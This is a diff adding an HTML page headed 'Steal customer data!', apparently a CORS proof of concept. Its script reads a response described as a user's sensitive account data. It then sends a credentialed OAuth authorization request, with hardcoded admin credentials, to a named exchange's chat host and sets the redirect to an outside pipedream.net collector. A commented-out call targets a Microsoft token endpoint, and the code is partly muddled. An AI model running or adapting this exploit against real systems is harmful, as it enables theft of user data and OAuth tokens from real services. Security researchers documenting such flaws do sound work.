@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html>
+<body>
+<center>
+<h3>Steal customer data!</h3>
+<html>
+<body>
+<button type='button' onclick='cors()'>Exploit</button>
+<p id='demo'></p>
+<script>
+function cors() {
+var xhttp = new XMLHttpRequest();
+xhttp.onreadystatechange = function() {
+if (this.readyState == 4 && this.status == 200) {
+var a = this.responseText; // Sensitive data from niche.co about user account
+document.getElementById("demo").innerHTML = a;
+xhttp.open("POST", "https://chattest.deribit.com/oauth/authorization_token", true);// Sending that data to Attacker's website
+xhttp.withCredentials = true;
+let data = {
+  "username":"admin%40chattest.deribit.com",
+  "password":"admin",
+  "response_type":"code",
+  "client_id":1,
+  "redirect_uri":"https://eophp7grrvo0vm1.m.pipedream.net",
+  "scope":"get_roster_sasl_auth",
+  "state":1
+};
+console.log(data);
+xhttp.send("data="+data);
+}
+};
+//xhttp.open("POST", "https://login.microsoftonline.com/ddba44de-d345-45cc-837c-387fdda6d87a/oauth2/v2.0/token", true);
+//xhttp.withCredentials = true;
+//xhttp.send();
+}
+</script>
+</body>
+</html>
